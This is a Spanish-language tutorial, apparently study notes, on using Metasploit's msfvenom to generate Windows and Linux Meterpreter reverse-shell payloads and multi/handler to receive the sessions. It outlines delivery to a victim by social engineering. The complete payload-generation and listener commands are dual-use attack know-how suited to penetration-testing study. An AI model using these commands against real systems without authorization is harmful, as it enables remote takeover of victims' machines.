# Fundamentos de `msfvenom` y Multi/Handler en Metasploit

## ¿Qué es `msfvenom`?

`msfvenom` es una herramienta de Metasploit Framework que permite:
- Generar payloads maliciosos (código que abre una conexión con el atacante).
- Elegir el sistema objetivo (Windows, Linux, etc.).
- Definir arquitectura (x86, x64).
- Seleccionar formato de salida (exe, elf, raw, etc.).

---

## Listar payloads disponibles

```bash
msfvenom --list payloads
```

Muestra todos los payloads disponibles. Algunos ejemplos útiles:
- `windows/meterpreter/reverse_tcp`
- `linux/x86/meterpreter/reverse_tcp`
- `windows/shell_reverse_tcp`

---

## Crear un payload para Windows

```bash
msfvenom -a x86 -p windows/meterpreter/reverse_tcp LHOST=<IP> LPORT=<PUERTO> -f exe > /home/kali/Desktop/payloadx86.exe
```

### Explicación:
- `-a x86`: Define la arquitectura (x86 = 32 bits).
- `-p windows/meterpreter/reverse_tcp`: Payload que abre una sesión Meterpreter con conexión inversa.
- `LHOST`: IP del atacante (Kali Linux).
- `LPORT`: Puerto que escuchará el handler.
- `-f exe`: Formato del archivo (ejecutable de Windows).
- `>`: Guarda el archivo generado.

---

## Ver los formatos disponibles

```bash
msfvenom --list formats
```

Ejemplos de formatos:
- `exe`: ejecutable Windows
- `elf`: ejecutable Linux
- `raw`: binario plano
- `asp`, `aspx`, `psh`: scripts
- `c`, `ruby`, `python`: payloads integrables en código

---

## Crear un payload para Linux

```bash
msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=<IP> LPORT=<PUERTO> -f elf > payload
```

### Explicación:
- `-p linux/x86/meterpreter/reverse_tcp`: Payload para sistemas Linux (x86).
- `-f elf`: Formato ELF (ejecutable Linux).
- `payload`: Nombre del archivo generado.

---

## Escuchar conexiones con Metasploit (multi/handler)

Una vez el payload se ejecuta en la máquina víctima, debemos estar a la escucha:

```bash
msfconsole
use exploit/multi/handler
set PAYLOAD windows/meterpreter/reverse_tcp   # O el que hayas usado
set LHOST <IP>
set LPORT <PUERTO>
run
```

### ¿Qué hace `multi/handler`?
Es un módulo que escucha conexiones entrantes. Cuando la víctima ejecuta el payload, se conecta de vuelta a tu máquina (Kali) y te da una sesión interactiva (`meterpreter`).

---

## Funcionamiento General

1. **Se genera el payload** con `msfvenom`.
2. **Se entrega a la víctima** (ingeniería social, RCE, etc.).
3. **La víctima lo ejecuta** y se conecta de vuelta al atacante.
4. **El atacante usa Metasploit con `multi/handler`** para recibir y controlar la sesión.

---



